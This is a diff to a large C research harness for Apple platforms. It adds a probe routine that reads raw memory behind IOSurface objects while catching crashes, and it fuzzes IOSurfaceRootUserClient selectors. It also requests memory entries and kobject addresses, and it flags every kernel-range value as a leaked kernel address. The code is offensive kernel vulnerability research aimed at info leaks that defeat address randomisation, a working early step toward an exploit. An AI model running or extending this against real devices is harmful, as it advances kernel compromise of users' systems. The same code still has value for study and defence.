@@ -16479,6 +16479,328 @@ static void r410_probe(void) {
 }
 
 /*
+ * r417: Sub-structure decode + CopyAllValues kernel data check.
+ *
+ * The shared data has 448-byte repeating sub-structures containing
+ * suspicious 0x61fcdc1c39c6XXXX values. Try to decode them.
+ * Also dump all IOSurface properties checking for kernel addresses.
+ */
+static volatile int g_r417_crashed = 0;
+static sigjmp_buf g_r417_jmp;
+static void r417_sighandler(int sig) {
+    g_r417_crashed = sig;
+    siglongjmp(g_r417_jmp, 1);
+}
+
+static void r417_probe(void) {
+    rlog("\n=== r417: Sub-structure Decode + CopyAllValues ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa417, old_bus417, old_segv417;
+    memset(&sa417, 0, sizeof(sa417));
+    sa417.sa_handler = r417_sighandler;
+    sa417.sa_flags = 0;
+    sigaction(SIGBUS, &sa417, &old_bus417);
+    sigaction(SIGSEGV, &sa417, &old_segv417);
+
+    unsigned pixFmt = 'BGRA';
+    const void *kk[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+    int w = 64, h = 64, bpr = 256, as = 16384;
+    CFNumberRef vv[] = {
+        CFNumberCreate(NULL, kCFNumberIntType, &w),
+        CFNumberCreate(NULL, kCFNumberIntType, &h),
+        CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+        CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+        CFNumberCreate(NULL, kCFNumberIntType, &as)
+    };
+    CFDictionaryRef props = CFDictionaryCreate(NULL, kk,
+        (const void**)vv, 5,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Vector 1: Full 448-byte sub-structure dump at +448 ---- */
+    rlog("  Vector 1: Full sub-structure at +448 (single surface)\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        /* Set some properties to populate kernel state */
+        CFStringRef pk = CFStringCreateWithCString(NULL, "testkey", kCFStringEncodingASCII);
+        int pv = 12345;
+        CFNumberRef pvn = CFNumberCreate(NULL, kCFNumberIntType, &pv);
+        IOSurfaceSetValue(surf, pk, pvn);
+        CFRelease(pk);
+        CFRelease(pvn);
+
+        uint64_t shPtr = *(uint64_t*)((uint8_t*)surf + 8);
+
+        g_r417_crashed = 0;
+        if (sigsetjmp(g_r417_jmp, 1) == 0) {
+            rlog("    Sub-structure at +448 (all qwords):\n");
+            for (int off = 448; off < 896; off += 8) {
+                uint64_t v = *(volatile uint64_t*)((uint8_t*)shPtr + off);
+                if (v != 0) {
+                    rlog("      +%d: 0x%016llx", off, (unsigned long long)v);
+                    /* Annotate known patterns */
+                    if ((v & 0xFFFFFFFFFFFF0000ULL) == 0x61fcdc1c39c60000ULL)
+                        rlog(" [CHAIN_PTR low16=0x%04x]",
+                            (unsigned)(v & 0xFFFF));
+                    else if (v == 0xFFFFFFFFFFFFFFFF)
+                        rlog(" [SENTINEL]");
+                    else if ((v >> 32) >= 0xFFFFFFFEULL)
+                        rlog(" [INTEGRITY_CHECK?]");
+                    else if ((v >> 40) == 0 && v > 0x100000000ULL)
+                        rlog(" [USERSPACE_PTR]");
+                    else if (v == 0x4d55545a || v == 0x4d55545a4d55545aULL)
+                        rlog(" [MUTZ]");
+                    rlog("\n");
+                }
+            }
+        } else {
+            rlog("    CRASHED at sub-structure +448 (sig=%d)\n", g_r417_crashed);
+        }
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Correlate chain ptr across surfaces ---- */
+    rlog("\n  Vector 2: Chain ptr values across 10 surfaces\n");
+    {
+        IOSurfaceRef surfs[10];
+        for (int i = 0; i < 10; i++)
+            surfs[i] = IOSurfaceCreate(props);
+
+        g_r417_crashed = 0;
+        if (sigsetjmp(g_r417_jmp, 1) == 0) {
+            for (int i = 0; i < 10; i++) {
+                uint64_t shPtr = *(uint64_t*)((uint8_t*)surfs[i] + 8);
+                rlog("    surf[%d] sid=%u shared=0x%llx:",
+                    i, IOSurfaceGetID(surfs[i]),
+                    (unsigned long long)shPtr);
+
+                /* Read chain ptrs at +448, +896, +1344 */
+                for (int slot = 1; slot <= 3; slot++) {
+                    int off = slot * 448;
+                    uint64_t v = *(volatile uint64_t*)((uint8_t*)shPtr + off);
+                    rlog(" [+%d]=0x%016llx", off, (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+
+            /* Check if chain ptr relates to shared ptr */
+            rlog("    Relationship analysis:\n");
+            for (int i = 0; i < 5; i++) {
+                uint64_t shPtr = *(uint64_t*)((uint8_t*)surfs[i] + 8);
+                uint64_t chain = *(volatile uint64_t*)((uint8_t*)shPtr + 448);
+                rlog("      shared=0x%llx chain=0x%llx xor=0x%llx sum=0x%llx\n",
+                    (unsigned long long)shPtr,
+                    (unsigned long long)chain,
+                    (unsigned long long)(shPtr ^ chain),
+                    (unsigned long long)(shPtr + chain));
+            }
+        } else {
+            rlog("    CRASHED (sig=%d)\n", g_r417_crashed);
+        }
+        for (int i = 0; i < 10; i++) CFRelease(surfs[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: CopyAllValues deep property dump ---- */
+    rlog("\n  Vector 3: CopyAllValues deep property dump\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+
+        /* Set some properties first */
+        CFStringRef pk = CFStringCreateWithCString(NULL, "test1", kCFStringEncodingASCII);
+        int pv = 42;
+        CFNumberRef pvn = CFNumberCreate(NULL, kCFNumberIntType, &pv);
+        IOSurfaceSetValue(surf, pk, pvn);
+        CFRelease(pk);
+        CFRelease(pvn);
+
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
+        if (allVals) {
+            CFIndex count = CFDictionaryGetCount(allVals);
+            rlog("    Total properties: %ld\n", (long)count);
+
+            const void **dictKeys = malloc(sizeof(void*) * count);
+            const void **dictVals = malloc(sizeof(void*) * count);
+            CFDictionaryGetKeysAndValues(allVals, dictKeys, dictVals);
+
+            for (CFIndex i = 0; i < count && i < 30; i++) {
+                char keyBuf[128] = {0};
+                if (CFGetTypeID(dictKeys[i]) == CFStringGetTypeID()) {
+                    CFStringGetCString(dictKeys[i], keyBuf, sizeof(keyBuf),
+                        kCFStringEncodingASCII);
+                }
+
+                CFTypeID tid = CFGetTypeID(dictVals[i]);
+                if (tid == CFNumberGetTypeID()) {
+                    long long nv = 0;
+                    CFNumberGetValue(dictVals[i], kCFNumberLongLongType, &nv);
+                    rlog("    [%ld] key=\"%s\" num=%lld (0x%llx)\n",
+                        (long)i, keyBuf, nv, (unsigned long long)nv);
+                    if ((uint64_t)nv >> 32 >= 0xFFFFFFF0ULL)
+                        rlog("         *** KERNEL RANGE VALUE ***\n");
+                } else if (tid == CFDataGetTypeID()) {
+                    CFIndex len = CFDataGetLength(dictVals[i]);
+                    const uint8_t *bytes = CFDataGetBytePtr(dictVals[i]);
+                    rlog("    [%ld] key=\"%s\" data len=%ld",
+                        (long)i, keyBuf, (long)len);
+                    /* Scan data for kernel-range values */
+                    int kernFound = 0;
+                    for (CFIndex b = 0; b + 7 < len; b += 8) {
+                        uint64_t dv;
+                        memcpy(&dv, bytes + b, 8);
+                        if ((dv >> 32) >= 0xFFFFFFF0ULL) {
+                            rlog("\n         *** KERNEL PTR at byte %ld: 0x%016llx ***",
+                                (long)b, (unsigned long long)dv);
+                            kernFound++;
+                        }
+                    }
+                    if (len <= 32) {
+                        rlog(" hex=");
+                        for (CFIndex b = 0; b < len; b++)
+                            rlog("%02x", bytes[b]);
+                    }
+                    rlog("\n");
+                } else if (tid == CFStringGetTypeID()) {
+                    char svBuf[256] = {0};
+                    CFStringGetCString(dictVals[i], svBuf, sizeof(svBuf),
+                        kCFStringEncodingASCII);
+                    rlog("    [%ld] key=\"%s\" str=\"%s\"\n",
+                        (long)i, keyBuf, svBuf);
+                } else {
+                    rlog("    [%ld] key=\"%s\" type=%lu\n",
+                        (long)i, keyBuf, (unsigned long)tid);
+                }
+            }
+            free(dictKeys);
+            free(dictVals);
+            CFRelease(allVals);
+        } else {
+            rlog("    CopyAllValues returned NULL\n");
+        }
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: IOSurfaceRootUserClient raw selector probing ---- */
+    rlog("\n  Vector 4: IOSurfaceRootUserClient raw selector probe\n");
+    {
+        io_service_t service = IOServiceGetMatchingService(
+            kIOMainPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+        rlog("    IOSurfaceRoot open: kr=%d conn=0x%x\n", kr, conn);
+
+        if (kr == KERN_SUCCESS) {
+            /* Try selectors 0-30 with output buffer to look for data leaks */
+            uint64_t outScalar[16];
+            uint32_t outScalarCnt;
+            uint8_t outStruct[4096];
+            size_t outStructSz;
+
+            for (int sel = 0; sel <= 30; sel++) {
+                outScalarCnt = 16;
+                outStructSz = 4096;
+                memset(outScalar, 0, sizeof(outScalar));
+                memset(outStruct, 0, sizeof(outStruct));
+
+                kr = IOConnectCallMethod(conn, sel,
+                    NULL, 0, NULL, 0,
+                    outScalar, &outScalarCnt,
+                    outStruct, &outStructSz);
+
+                if (kr == KERN_SUCCESS || outScalarCnt > 0 || outStructSz > 0) {
+                    rlog("    sel=%d: kr=%d(0x%x) outScalar=%u outStruct=%zu\n",
+                        sel, kr, kr, outScalarCnt, outStructSz);
+
+                    /* Check for kernel-range values in output */
+                    for (uint32_t s = 0; s < outScalarCnt; s++) {
+                        if (outScalar[s] != 0) {
+                            rlog("      scalar[%d]=0x%016llx", s,
+                                (unsigned long long)outScalar[s]);
+                            if ((outScalar[s] >> 32) >= 0xFFFFFFF0ULL)
+                                rlog(" *** KERNEL RANGE ***");
+                            rlog("\n");
+                        }
+                    }
+                    for (size_t b = 0; b + 7 < outStructSz; b += 8) {
+                        uint64_t sv;
+                        memcpy(&sv, outStruct + b, 8);
+                        if (sv != 0 && (sv >> 32) >= 0xFFFFFFF0ULL) {
+                            rlog("      struct[%zu]=0x%016llx *** KERNEL RANGE ***\n",
+                                b, (unsigned long long)sv);
+                        }
+                    }
+                }
+            }
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(service);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 5: mach_make_memory_entry_64 on IOSurface backing ---- */
+    rlog("\n  Vector 5: memory entry from IOSurface backing\n");
+    {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        memory_object_size_t meSize = 16384;
+        mach_port_t mePort = MACH_PORT_NULL;
+        kern_return_t kr = mach_make_memory_entry_64(
+            mach_task_self(), &meSize,
+            (memory_object_offset_t)(uintptr_t)base,
+            VM_PROT_READ | VM_PROT_WRITE,
+            &mePort, MACH_PORT_NULL);
+
+        rlog("    make_memory_entry: kr=%d port=0x%x size=%llu\n",
+            kr, mePort, (unsigned long long)meSize);
+
+        if (kr == KERN_SUCCESS && mePort != MACH_PORT_NULL) {
+            /* Get kobject info for the memory entry port */
+            unsigned int kotype = 0;
+            mach_vm_address_t koaddr = 0;
+            kr = mach_port_kobject(mach_task_self(), mePort, &kotype, &koaddr);
+            rlog("    kobject: kr=%d type=%u addr=0x%llx\n",
+                kr, kotype, (unsigned long long)koaddr);
+
+            if (koaddr != 0 && (koaddr >> 32) >= 0xFFFFFFF0ULL)
+                rlog("    *** KERNEL ADDRESS LEAKED: 0x%llx ***\n",
+                    (unsigned long long)koaddr);
+
+            /* Try mach_port_kernel_object */
+            unsigned int kotype2 = 0;
+            unsigned int koaddr2 = 0;
+            kr = mach_port_kernel_object(mach_task_self(), mePort,
+                &kotype2, &koaddr2);
+            rlog("    kernel_object: kr=%d type=%u addr=0x%x\n",
+                kr, kotype2, koaddr2);
+
+            mach_port_deallocate(mach_task_self(), mePort);
+        }
+        CFRelease(surf);
+    }
+    fflush(stdout);
+
+    CFRelease(props);
+    for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+
+    sigaction(SIGBUS, &old_bus417, NULL);
+    sigaction(SIGSEGV, &old_segv417, NULL);
+
+    rlog("\n=== r417 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r416: Deep obj_id correlation + extended shared data scan.
  *
  * mach_vm_page_info flavor=1 returns 64-bit obj_id.
@@ -69896,6 +70218,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 420) {
+            rlog("*** rounds=420: Sub-structure Decode + CopyAllValues ***\n");
+            rlog("  Chain ptr analysis, raw selector probe, memory entry.\n\n");
+            fflush(stdout);
+            r417_probe();
+            goto done;
+        }
         if (rounds == 419) {
             rlog("*** rounds=419: Deep obj_id + Extended Shared Data ***\n");
             rlog("  64-bit obj_id correlation, extended shared scan, alloc size test.\n\n");
@@ -72421,7 +72750,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
